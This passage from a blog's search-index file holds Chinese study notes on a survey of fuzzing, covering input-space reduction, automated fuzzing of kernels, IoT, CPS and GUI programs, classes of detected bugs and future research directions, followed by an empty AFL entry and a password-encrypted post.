class="headerlink" title="4.1 Byte-constraint Relation"></a>4.1 Byte-constraint Relation</h3><h3 id="4-2-Concolic-Execution"><a href="#4-2-Concolic-Execution" class="headerlink" title="4.2 Concolic Execution"></a>4.2 Concolic Execution</h3><h3 id="4-3-程序转换"><a href="#4-3-程序转换" class="headerlink" title="4.3 程序转换"></a>4.3 程序转换</h3><p>对模糊测试而言，程序转换（Program Transformation）的目的是移除防止模糊测试发现更多执行状态的完整性检查，通过移除这些检查，模糊测试可以探索到目标程序更深处的代码并暴露出潜在的漏洞，但这也会引入一些误报（false positives），可以通过符合执行进行验证。</p><p>因此 Program Transformation 通过聚焦于可能触发漏洞的输入来缩小探索空间。</p><h3 id="4-4-Input-Model"><a href="#4-4-Input-Model" class="headerlink" title="4.4 Input Model"></a>4.4 Input Model</h3><p>许多应用程序都需要高度结构化的输入，例如协议实现、系统调用等，输入模型（input model）指定了构造高度结构化的输入的规则，包括结构体、格式、输入的数据约束，即违反语法或语义的输入会在一开始就被拒绝，由此输入空间便被限制于输入模型。</p><h3 id="4-5-Fragment-Recombination"><a href="#4-5-Fragment-Recombination" class="headerlink" title="4.5 Fragment Recombination"></a>4.5 Fragment Recombination</h3><h3 id="4-6-Format-Inference"><a href="#4-6-Format-Inference" class="headerlink" title="4.6 Format Inference"></a>4.6 Format Inference</h3><h4 id="4-6-1-Corpus-based"><a href="#4-6-1-Corpus-based" class="headerlink" title="4.6.1 Corpus-based"></a>4.6.1 Corpus-based</h4><h4 id="4-6-2-Coverage-based"><a href="#4-6-2-Coverage-based" class="headerlink" title="4.6.2 Coverage-based"></a>4.6.2 Coverage-based</h4><h4 id="4-6-3-Encoding-Function"><a href="#4-6-3-Encoding-Function" class="headerlink" title="4.6.3 Encoding Function"></a>4.6.3 Encoding Function</h4><h3 id="4-7-Dependency-Inference"><a href="#4-7-Dependency-Inference" class="headerlink" title="4.7 Dependency Inference"></a>4.7 Dependency Inference</h3><p>格式推断主要解决语法需求，这仍可能生成有着错误数据依赖项的输入。</p><h2 id="0x05-自动化"><a href="#0x05-自动化" class="headerlink" title="0x05 自动化"></a>0x05 自动化</h2><p>自动执行是模糊测试理论与输入空间减方法的基础，而成功的模糊测试需要：</p><ul><li>自动重复地运行 PUTs。大部分 fuzzer 都能测试命令行程序，但对于硬件或多语言而言不行。</li><li>对潜在漏洞的自动指示器</li><li>高速执行。在相同的时间内检验更多的测试用例，以此增加发现漏洞的机会。</li></ul><h3 id="5-1-Automatic-Execution-of-PUTs"><a href="#5-1-Automatic-Execution-of-PUTs" class="headerlink" title="5.1 Automatic Execution of PUTs"></a>5.1 Automatic Execution of PUTs</h3><p>对不同应用程序的自动化模糊测试需要不同的工程努力，本节介绍几种自动化模糊测试的方法</p><h4 id="5-1-1-Command-line-Programs"><a href="#5-1-1-Command-line-Programs" class="headerlink" title="5.1.1 Command-line Programs"></a>5.1.1 Command-line Programs</h4><h4 id="5-1-2-Deep-Learning-Systems"><a href="#5-1-2-Deep-Learning-Systems" class="headerlink" title="5.1.2 Deep Learning Systems"></a>5.1.2 Deep Learning Systems</h4><h4 id="5-1-3-Operating-System-Kernels"><a href="#5-1-3-Operating-System-Kernels" class="headerlink" title="5.1.3 Operating System Kernels"></a>5.1.3 Operating System Kernels</h4><p>OS kernel 包含了许多中断与内核线程，其执行状态无法确定，由此我们使用 hypervisor（如 QEMU）来运行内核，并通过 <a href="https://zhangtong16.github.io/2019/06/05/Intel-Processor-Trace/">Intel’s Processor Trace</a> （PT）技术来获取代码覆盖；尽管这种方法能带反馈地测试不同种内核，但仍需要人工构造语法&amp;语义正确的输入</p><p>因为输入包括文件系统镜像或一系列系统调用，fuzzers 可以以更轻量级的方法进行测试：在系统调用的数据依赖项被分析&#x2F;推断出来后生成一系列系统调用并在目标内核上运行，并监测代表潜在漏洞的 system panics</p><p>另一种测试方法是通过模拟外设并生成相应输入来测试内核驱动</p><h4 id="5-1-4-Cyber-Physical-Systems"><a href="#5-1-4-Cyber-Physical-Systems" class="headerlink" title="5.1.4 Cyber-Physical Systems"></a>5.1.4 Cyber-Physical Systems</h4><p><strong>信息物理系统</strong>（Cyber-Physical Systems，CPS）包含两个紧密结合的主要成分，即<strong>计算元素</strong>（computational elements）与<strong>物理过程</strong>（physical processes）</p><p>一个被广泛使用的计算元素是 <em>可编程逻辑控制器</em> （programmable logic controller，PLC），其控制着物理过程的驱动器并从传感器中获取输入，因此在 fuzzing CPSs 时 fuzzer 可以替换掉 PLCs 并通过网络直接向驱动器发送大量的命令</p><p>PLC 的二进制文件也是 CPSs 的一个可测试点，但其有着多种二进制格式以及复杂的与物理实体间的通信；基于对 PLC 二进制文件与开发平台的分析，自动化的 fuzz 可以在其运行在 PLC 设备上时进行</p><h4 id="5-1-5-Internet-of-Things"><a href="#5-1-5-Internet-of-Things" class="headerlink" title="5.1.5 Internet of Things"></a>5.1.5 Internet of Things</h4><p>IOT 的自动化 fuzzing 包括固件模拟与网络级测试：</p><ul><li>模拟器可以在没有对应的硬件时模拟运行 IOT 固件，以灰盒模式测试目标程序。</li><li>网络级的 fuzzing 以黑盒模式进行测试，即通过网络向 IOT 设备发送信息，以响应作为执行结果，fitness 便是类型数量。</li></ul><h4 id="5-1-6-Applications-with-Graphical-User-Interface"><a href="#5-1-6-Applications-with-Graphical-User-Interface" class="headerlink" title="5.1.6 Applications with Graphical User Interface"></a>5.1.6 Applications with Graphical User Interface</h4><p>GUI 程序的执行比命令行慢得多，而执行速度是 fuzzing 的关键，因此对 GUI 程序的自动化测试通常将 GUI 替换为一种更快的方案并以命令行模式执行目标</p><blockquote><p>例如对 UI 操作建模后为安卓应用生成事件序列（event sequences）</p></blockquote><p>此外，fuzzer 也可以使用 <strong>hardness</strong> 来准备执行上下文，以直接唤醒 GUIs 中的目标函数。</p><h4 id="5-1-7-Applications-with-Network"><a href="#5-1-7-Applications-with-Network" class="headerlink" title="5.1.7 Applications with Network"></a>5.1.7 Applications with Network</h4><p>智能合约、协议实现、云服务、Android Native System Services、机器人装置等通过网络接收输入，由此可以在本地生成输入后由目标应用远程执行，自动测试的效率依赖于生成输入的质量与反映执行状态的 fitness</p><h3 id="5-2-Automatic-Detection-of-Bugs"><a href="#5-2-Automatic-Detection-of-Bugs" class="headerlink" title="5.2 Automatic Detection of Bugs"></a>5.2 Automatic Detection of Bugs</h3><h4 id="5-2-1-Memory-violaton-Bugs"><a href="#5-2-1-Memory-violaton-Bugs" class="headerlink" title="5.2.1 Memory-violaton Bugs"></a>5.2.1 Memory-violaton Bugs</h4><p>内存破坏漏洞（Memory-violaton Bugs）是最古老也最严重的安全漏洞，分为两类：</p><ul><li>空间安全损坏</li><li>时间安全损坏</li></ul><h4 id="5-2-2-并发漏洞"><a href="#5-2-2-并发漏洞" class="headerlink" title="5.2.2 并发漏洞"></a>5.2.2 并发漏洞</h4><p>并发型漏洞</p><h4 id="5-2-3-Algorithmic-Complexity"><a href="#5-2-3-Algorithmic-Complexity" class="headerlink" title="5.2.3 Algorithmic Complexity"></a>5.2.3 Algorithmic Complexity</h4><p><strong>算法复杂性</strong>（Algorithm Complexity，AC）漏洞是算法在最坏情况下会显著的降低性能，从而可能导致拒绝服务（Denial-of-Service）攻击，Fig.9 展示了一个有着不同算法复杂度的例子，在最坏情况下可以被攻击者用作 DoS 攻击：</p><h4 id="5-2-4-Spectre-type-Bugs"><a href="#5-2-4-Spectre-type-Bugs" class="headerlink" title="5.2.4 Spectre-type Bugs"></a>5.2.4 Spectre-type Bugs</h4><p><strong>幽灵型漏洞</strong>（Spectre-type Bugs）是一种利用错误分支预测（mispredicted branch speculations）来控制内存访问的微架构攻击，例如在 Fig.10 中攻击者可以利用有效值来训练分支预测为真，随后给变量一个 OOB 的值，此时预测器便会错误预测分支行为，从而错误地执行了第3、4行代码，造成了越界读取</p><h4 id="5-2-5-侧信道"><a href="#5-2-5-侧信道" class="headerlink" title="5.2.5 侧信道"></a>5.2.5 侧信道</h4><p><strong>侧信道漏洞</strong>（side-channel）通过对系统的非功能性表现（例如执行时间）来泄露信息，例如通过分支执行时间判断执行的分支</p><blockquote><p>论文没给例子，那笔者给出一个例子：<a href="https://gruss.cc/files/prefetch.pdf">prefetch side-channel attack: bypassing SMAP and KASLR</a></p></blockquote><p><strong>JIT-induced side channels</strong>（<del>不懂咋翻</del>）是一种由即时优化（Just-In-Time Optimization）导致的特殊侧信道，类似于幽灵型漏洞，通过训练 JIT 编译器优化单一分支以使得两执行分支间执行时间差大到可以被观测到</p><h4 id="5-2-6-Integer-Bugs"><a href="#5-2-6-Integer-Bugs" class="headerlink" title="5.2.6 Integer Bugs"></a>5.2.6 Integer Bugs</h4><p><strong>整型上溢&#x2F;下溢</strong>（Integer Overflow&#x2F;Underflow）在算术表达式的值超过机器类型所决定的范围时发生，或是在整型间转换时发生（比如 int to uint）</p><blockquote><p>论文举了这个例子：<a href="https://dl.acm.org/doi/10.5555/1855768.1855773">SmartFuzz</a></p></blockquote><h3 id="5-3-Improvement-of-Execution-Speed"><a href="#5-3-Improvement-of-Execution-Speed" class="headerlink" title="5.3 Improvement of Execution Speed"></a>5.3 Improvement of Execution Speed</h3><h4 id="5-3-1-二进制分析"><a href="#5-3-1-二进制分析" class="headerlink" title="5.3.1 二进制分析"></a>5.3.1 二进制分析</h4><p><strong>静态插桩</strong>（static instrumentation）是主流的获取执行状态的方式，因为其为 fuzzing 提供了更高的执行速度。</p><ul><li>对开源程序而言，一个被广泛使用的静态分析工具是 LLVM，其在编译器进行插桩。</li><li>对于闭源程序而言，fuzzer 被限制于二进制分析，但二进制插桩工具有着不菲的运行时开销</li></ul><h4 id="5-3-2-Execution-Process"><a href="#5-3-2-Execution-Process" class="headerlink" title="5.3.2 Execution Process"></a>5.3.2 Execution Process</h4><p>执行速度同样可以在模糊测试过程中提升</p><h4 id="5-3-3-各种应用"><a href="#5-3-3-各种应用" class="headerlink" title="5.3.3 各种应用"></a>5.3.3 各种应用</h4><p>模糊测试被用以检测多种目标中的缺陷，如 IOT、OS Kernel VMM 等，需要根据目标特性进行定制化。</p><p>论文给出了这些例子：</p><ul><li>FIRM-AFL 通过结合用户态模拟与全系统模拟来缓解传统 IOT 固件 fuzzing 中全系统模拟带来的虚拟地址与内存访问间翻译及模拟系统调用的开销</li><li>Schumilo 设计了一种</li></ul><h2 id="0x06-Fuzzing-未来研究方向"><a href="#0x06-Fuzzing-未来研究方向" class="headerlink" title="0x06 Fuzzing 未来研究方向"></a>0x06 Fuzzing 未来研究方向</h2><p>Fuzzing 未来的研究方向与挑战：</p><ul><li><p><strong>更灵敏的适应度函数（More sensitive fitness）</strong>：研究人员意识到仅依靠代码覆盖率在发现复杂漏洞时存在局限性，因此尝试引入基于漏洞分析获得的信息来改进适应度函数。未来工作可聚焦于基于漏洞特性进行漏洞检测，尤其是针对现有模糊测试未能发现的漏洞进行深入分析。</p></li><li><p><strong>更完善的模糊测试理论（More sophisticated fuzzing theory）</strong>：目前大部分研究集中于种子调度，少数关注模糊测试的其他环节。构建完整的数学模型虽不易，但多种模糊测试过程可共存，例如利用博弈论同时考虑种子调度与字节调度。未来更宏大的研究方向包括探索模糊测试理论的局限性（如灰盒模糊测试的限制），以及结合多种适应度函数，设计既考虑漏洞出现又兼顾状态转移的先进模糊测试过程。</p></li><li><p><strong>科学的评估方法（Sound evaluation）</strong>：部分工作关注评估的可靠性，但尚无定论（见 §3.6）。亟待解决的问题包括：评估语料库应使用真实漏洞还是合成漏洞？静态测试能否作为区分模糊测试技术的最终标准？合理的时间预算如何确定？如何在缺乏可比较模糊测试器的情况下评估特殊目标（如硬件）？</p></li><li><p><strong>可扩展的输入格式推断（Scalable input inference）</strong>：利用格式或数据依赖项可显著提升模糊测试效率（见 §4.6 和 §4.7）。静态分析广泛用于格式和数据依赖推断，但其结果高度依赖特定程序且实现复杂。动态分析主要关注格式推断，较少涉及数据依赖推断，但具有更好的可扩展性。</p></li><li><p><strong>高效的变异操作符（Efficient mutation operators）</strong> 几乎所有模糊测试工具都采用混合变异器，但通常不动态调整变异器。部分研究优化了变异器调度，但鲜有关注可变变异器设计。鉴于变异器调度与字节调度密切相关，未来可探索基于字节调度的变异器设计，特别是在处理高度结构化输入时的调度策略。</p></li><li><p><strong>更多类型的应用场景（More types of applications）</strong>：由于应用复杂性，模糊测试在检测某些应用（如 CPSs）时能力有限。鉴于执行速度对模糊测试的重要性，提升难以被模糊测试的程序的执行效率是潜在的发展方向。</p></li><li><p><strong>更多类型的漏洞（More types of bugs）</strong>：模糊测试在检测内存破坏、并发漏洞、算法复杂性漏洞等方面表现良好（见 §5.2），但在权限提升、逻辑漏洞等方面仍有挑战。设计合适的漏洞检测指标（indicator）尤为困难，需要研究人员同时具备对模糊测试技术和目标漏洞的深刻理解。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Fuzz </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Paper </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AFL源码分析</title>
      <link href="/2025/07/01/fuzz/src/afl/"/>
      <url>/2025/07/01/fuzz/src/afl/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> Fuzz </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fuzzer源码分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代审和Fuzzing训练1</title>
      <link href="/2025/07/01/fuzz/cve/chap1/"/>
      <url>/2025/07/01/fuzz/cve/chap1/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="8c8714bee3e10e5d8fa9b1a2c2305c99ba04f569cd44962d294b267768fc8115">348d2dcafb97cf7fd5de5b11bc368b101bb387e6746b15f5877dd43c1ce50fd2</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">本文已加密，请输入密码查看。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Fuzz </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
